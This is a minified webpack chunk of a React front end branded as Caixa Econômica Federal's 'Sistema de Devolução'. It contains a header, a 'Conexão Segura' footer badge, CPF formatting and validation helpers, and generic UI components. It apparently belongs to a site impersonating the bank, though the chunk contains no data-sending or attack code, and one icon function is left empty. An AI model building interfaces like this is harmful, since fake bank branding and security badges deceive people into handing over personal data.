"use strict";
(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [669], {
    7: (e, t, r) => {
      r.d(t, {
        A: () => i
      });
      var n = r(6814),
        a = r(5908),
        s = r(751),
        l = r(1272);

      function i(e) {
        let {
          userName: t,
          loading: r
        } = e;
        return (0, n.jsx)("header", {
          className: "bg-white shadow-sm",
          children: (0, n.jsxs)("div", {
            className: "flex justify-between items-center p-2",
            children: [(0, n.jsx)("div", {
              className: "flex items-center mr-2",
              children: (0, n.jsx)("img", {
                src: "https://www.caixa.gov.br/PublishingImages/nova-home/icones/x-volume-positiva-54-v2.png",
                alt: "Caixa Econômica Federal",
                width: 54,
                height: 54,
                className: "w-12"
              })
            }), (0, n.jsxs)("div", {
              className: "flex items-center gap-2 p-2 rounded-md bg-[rgba(22,93,169,1)]",
              children: [(0, n.jsx)(a.A, {
                className: "size-4 text-white"
              }), r ? (0, n.jsx)(l.E, {
                className: "h-4 w-10 bg-white/20"
              }) : t ? (0, n.jsx)("span", {
                className: "text-white font-bold text-xs",
                children: t
              }) : null]
            })]
          })
        })
      }
    },
    1272: (e, t, r) => {
      r.d(t, {
        E: () => s
      });
      var n = r(6814),
        a = r(4682);

      function s(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, n.jsx)("div", {
          "data-slot": "skeleton",
          className: (0, a.cn)("bg-accent animate-pulse rounded-md", t),
          ...r
        })
      }
    },
    2726: (e, t, r) => {
      r.d(t, {
        w: () => i
      });
      var n = r(6814);

      function a(e) {
        return (0, n.jsxs)("svg", {
          ...e,
          xmlns: "http://www.w3.org/2000/svg",
          viewBox: "0 0 810 810",
          fill: "none",
          preserveAspectRatio: "xMidYMid meet",
          children: [(0, n.jsxs)("defs", {
            children: [(0, n.jsx)("clipPath", {
              id: "lock-clip-1",
              children: (0, n.jsx)("path", {
                d: "M171 13.230469 L639 13.230469 L639 507 L171 507 Z"
              })
            }), (0, n.jsx)("clipPath", {
              id: "lock-clip-2",
              children: (0, n.jsx)("path", {
                d: "M129 369 L681 369 L681 796.980469 L129 796.980469 Z"
              })
            })]
          }), (0, n.jsx)("g", {
            clipPath: "url(#lock-clip-1)",
            children: (0, n.jsx)("path", {
              fill: "currentColor",
              fillRule: "evenodd",
              d: "M405.007812 13.230469 C275.671875 13.230469 171.550781 117.351562 171.550781 246.683594 L171.550781 506.078125 L236.398438 506.078125 L236.398438 246.683594 C236.398438 153.28125 311.59375 78.078125 405.007812 78.078125 C498.417969 78.078125 573.613281 153.273438 573.613281 246.683594 L573.613281 506.078125 L638.460938 506.078125 L638.460938 246.683594 C638.460938 117.351562 534.339844 13.230469 405.007812 13.230469 Z"
            })
          }), (0, n.jsx)("g", {
            clipPath: "url(#lock-clip-2)",
            children: (0, n.jsx)("path", {
              fill: "currentColor",
              fillRule: "evenodd",
              d: "M132.4375 369.9375 L677.574219 369.9375 C678 369.9375 678.414062 370.019531 678.808594 370.179688 C679.203125 370.34375 679.550781 370.578125 679.851562 370.878906 C680.15625 371.183594 680.386719 371.53125 680.550781 371.925781 C680.714844 372.320312 680.796875 372.730469 680.796875 373.15625 L680.796875 793.652344 C680.796875 794.082031 680.714844 794.492188 680.550781 794.886719 C680.386719 795.28125 680.15625 795.628906 679.851562 795.933594 C679.550781 796.234375 679.203125 796.464844 678.808594 796.628906 C678.414062 796.792969 678 796.875 677.574219 796.875 L132.4375 796.875 C132.011719 796.875 131.601562 796.792969 131.207031 796.628906 C130.8125 796.464844 130.464844 796.234375 130.160156 795.933594 C129.859375 795.628906 129.625 795.28125 129.460938 794.886719 C129.300781 794.492188 129.21875 794.082031 129.21875 793.652344 L129.21875 373.15625 C129.21875 372.730469 129.300781 372.320312 129.460938 371.925781 C129.625 371.53125 129.859375 371.183594 130.160156 370.878906 C130.464844 370.578125 130.8125 370.34375 131.207031 370.179688 C131.601562 370.019531 132.011719 369.9375 132.4375 369.9375 Z"
            })
          })]
        })
      }
      var s = r(751);

      function l(e) {
        let {
          className: t,
          ...r
        } = e
      }

      function i() {
        return (0, n.jsx)("footer", {
          className: "p-2",
          children: (0, n.jsxs)("div", {
            className: "pt-4 border-t border-gray-200",
            children: [(0, n.jsxs)("div", {
              className: "flex items-center justify-center gap-6 text-xs text-gray-500",
              children: [(0, n.jsxs)("div", {
                className: "flex items-center gap-1",
                children: [(0, n.jsx)(a, {
                  className: "size-4"
                }), (0, n.jsx)("span", {
                  className: "text-[.6rem]",
                  children: "Conex\xe3o Segura"
                })]
              }), (0, n.jsxs)("div", {
                className: "flex items-center gap-1",
                children: [(0, n.jsx)(l, {
                  className: "size-4"
                }), (0, n.jsx)("span", {
                  className: "text-[.6rem]",
                  children: "Caixa Econ\xf4mica Federal"
                })]
              })]
            }), (0, n.jsx)("p", {
              className: "text-center text-xs text-gray-400 mt-1",
              children: "Sistema de Devolu\xe7\xe3o da Caixa - Todos os direitos reservados"
            })]
          })
        })
      }
    },
    4682: (e, t, r) => {
      r.d(t, {
        cn: () => s
      });
      var n = r(6554),
        a = r(7038);

      function s() {
        for (var e = arguments.length, t = Array(e), r = 0; r < e; r++) t[r] = arguments[r];
        return (0, a.QP)((0, n.$)(t))
      }
    },
    6063: (e, t, r) => {
      function n(e) {
        let t = e.replace(/\D/g, ""),
          r = "";
        for (let e = 0; e < t.length && e < 11; e++) 3 === e || 6 === e ? r += "." : 9 === e && (r += "-"), r += t[e];
        return r
      }

      function a(e) {
        return e.toLowerCase().split(" ").map(e => e.charAt(0).toUpperCase() + e.slice(1)).join(" ")
      }

      function s(e) {
        let t = e.replace(/\D/g, "");
        if (11 !== t.length || /^(\d)\1{10}$/.test(t)) return !1;
        let r = 0;
        for (let e = 0; e < 9; e++) r += Number.parseInt(t.charAt(e)) * (10 - e);
        let n = 10 * r % 11;
        if ((10 === n || 11 === n) && (n = 0), n !== Number.parseInt(t.charAt(9))) return !1;
        r = 0;
        for (let e = 0; e < 10; e++) r += Number.parseInt(t.charAt(e)) * (11 - e);
        return (10 == (n = 10 * r % 11) || 11 === n) && (n = 0), n === Number.parseInt(t.charAt(10))
      }
      r.d(t, {
        Or: () => s,
        bb: () => n,
        kR: () => a
      })
    },
    6352: (e, t, r) => {
      r.d(t, {
        DX: () => i,
        TL: () => l
      });
      var n = r(2094);

      function a(e, t) {
        if ("function" == typeof e) return e(t);
        null != e && (e.current = t)
      }
      var s = r(6814);

      function l(e) {
        let t = function(e) {
            let t = n.forwardRef((e, t) => {
              let {
                children: r,
                ...s
              } = e;
              if (n.isValidElement(r)) {
                var l;
                let e, i, o = (l = r, (i = (e = Object.getOwnPropertyDescriptor(l.props, "ref")?.get) && "isReactWarning" in e && e.isReactWarning) ? l.ref : (i = (e = Object.getOwnPropertyDescriptor(l, "ref")?.get) && "isReactWarning" in e && e.isReactWarning) ? l.props.ref : l.props.ref || l.ref),
                  d = function(e, t) {
                    let r = {
                      ...t
                    };
                    for (let n in t) {
                      let a = e[n],
                        s = t[n];
                      /^on[A-Z]/.test(n) ? a && s ? r[n] = (...e) => {
                        let t = s(...e);
                        return a(...e), t
                      } : a && (r[n] = a) : "style" === n ? r[n] = {
                        ...a,
                        ...s
                      } : "className" === n && (r[n] = [a, s].filter(Boolean).join(" "))
                    }
                    return {
                      ...e,
                      ...r
                    }
                  }(s, r.props);
                return r.type !== n.Fragment && (d.ref = t ? function(...e) {
                  return t => {
                    let r = !1,
                      n = e.map(e => {
                        let n = a(e, t);
                        return r || "function" != typeof n || (r = !0), n
                      });
                    if (r) return () => {
                      for (let t = 0; t < n.length; t++) {
                        let r = n[t];
                        "function" == typeof r ? r() : a(e[t], null)
                      }
                    }
                  }
                }(t, o) : o), n.cloneElement(r, d)
              }
              return n.Children.count(r) > 1 ? n.Children.only(null) : null
            });
            return t.displayName = `${e}.SlotClone`, t
          }(e),
          r = n.forwardRef((e, r) => {
            let {
              children: a,
              ...l
            } = e, i = n.Children.toArray(a), o = i.find(d);
            if (o) {
              let e = o.props.children,
                a = i.map(t => t !== o ? t : n.Children.count(e) > 1 ? n.Children.only(null) : n.isValidElement(e) ? e.props.children : null);
              return (0, s.jsx)(t, {
                ...l,
                ref: r,
                children: n.isValidElement(e) ? n.cloneElement(e, void 0, a) : null
              })
            }
            return (0, s.jsx)(t, {
              ...l,
              ref: r,
              children: a
            })
          });
        return r.displayName = `${e}.Slot`, r
      }
      var i = l("Slot"),
        o = Symbol("radix.slottable");

      function d(e) {
        return n.isValidElement(e) && "function" == typeof e.type && "__radixId" in e.type && e.type.__radixId === o
      }
    },
    6695: (e, t, r) => {
      r.d(t, {
        Wu: () => o,
        ZB: () => i,
        Zp: () => s,
        aR: () => l,
        wL: () => d
      });
      var n = r(6814);
      r(2094);
      var a = r(4682);

      function s(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, n.jsx)("div", {
          "data-slot": "card",
          className: (0, a.cn)("bg-card text-card-foreground flex flex-col gap-4 rounded-xl border py-6 shadow-sm", t),
          ...r
        })
      }

      function l(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, n.jsx)("div", {
          "data-slot": "card-header",
          className: (0, a.cn)("@container/card-header grid auto-rows-min grid-rows-[auto_auto] items-start gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6", t),
          ...r
        })
      }

      function i(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, n.jsx)("div", {
          "data-slot": "card-title",
          className: (0, a.cn)("leading-none font-semibold", t),
          ...r
        })
      }

      function o(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, n.jsx)("div", {
          "data-slot": "card-content",
          className: (0, a.cn)("px-6", t),
          ...r
        })
      }

      function d(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, n.jsx)("div", {
          "data-slot": "card-footer",
          className: (0, a.cn)("flex items-center px-6 [.border-t]:pt-6", t),
          ...r
        })
      }
    },
    8421: (e, t, r) => {
      r.d(t, {
        a: () => s
      });
      var n = r(6814),
        a = r(8388);

      function s() {
        return (0, n.jsx)("div", {
          className: "fixed inset-0 z-50 flex items-center justify-center",
          style: {
            background: "linear-gradient(90deg, #015ea2, #1875a7, #2586a7, #3498a8)"
          },
          children: (0, n.jsx)(a.A, {
            className: "size-10 rounded-full animate-spin text-white"
          })
        })
      }
    },
    9579: (e, t, r) => {
      r.d(t, {
        $: () => c
      });
      var n = r(6814);
      r(2094);
      var a = r(6352),
        s = r(6554);
      let l = e => "boolean" == typeof e ? `${e}` : 0 === e ? "0" : e,
        i = s.$;
      var o = r(4682);
      let d = ((e, t) => r => {
        var n;
        if ((null == t ? void 0 : t.variants) == null) return i(e, null == r ? void 0 : r.class, null == r ? void 0 : r.className);
        let {
          variants: a,
          defaultVariants: s
        } = t, o = Object.keys(a).map(e => {
          let t = null == r ? void 0 : r[e],
            n = null == s ? void 0 : s[e];
          if (null === t) return null;
          let i = l(t) || l(n);
          return a[e][i]
        }), d = r && Object.entries(r).reduce((e, t) => {
          let [r, n] = t;
          return void 0 === n || (e[r] = n), e
        }, {});
        return i(e, o, null == t || null == (n = t.compoundVariants) ? void 0 : n.reduce((e, t) => {
          let {
            class: r,
            className: n,
            ...a
          } = t;
          return Object.entries(a).every(e => {
            let [t, r] = e;
            return Array.isArray(r) ? r.includes({
              ...s,
              ...d
            } [t]) : ({
              ...s,
              ...d
            })[t] === r
          }) ? [...e, r, n] : e
        }, []), null == r ? void 0 : r.class, null == r ? void 0 : r.className)
      })("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive", {
        variants: {
          variant: {
            default: "bg-primary text-primary-foreground shadow-xs hover:bg-primary/90",
            destructive: "bg-destructive text-white shadow-xs hover:bg-destructive/90 focus-visible:ring-destructive/20 dark:focus-visible:ring-destructive/40 dark:bg-destructive/60",
            outline: "border bg-background shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50",
            secondary: "bg-secondary text-secondary-foreground shadow-xs hover:bg-secondary/80",
            ghost: "hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50",
            link: "text-primary underline-offset-4 hover:underline"
          },
          size: {
            default: "h-9 px-4 py-2 has-[>svg]:px-3",
            sm: "h-8 rounded-md gap-1.5 px-3 has-[>svg]:px-2.5",
            lg: "h-10 rounded-md px-6 has-[>svg]:px-4",
            icon: "size-9"
          }
        },
        defaultVariants: {
          variant: "default",
          size: "default"
        }
      });

      function c(e) {
        let {
          className: t,
          variant: r,
          size: s,
          asChild: l = !1,
          ...i
        } = e, c = l ? a.DX : "button";
        return (0, n.jsx)(c, {
          "data-slot": "button",
          className: (0, o.cn)(d({
            variant: r,
            size: s,
            className: t
          })),
          ...i
        })
      }
    }
  }
]);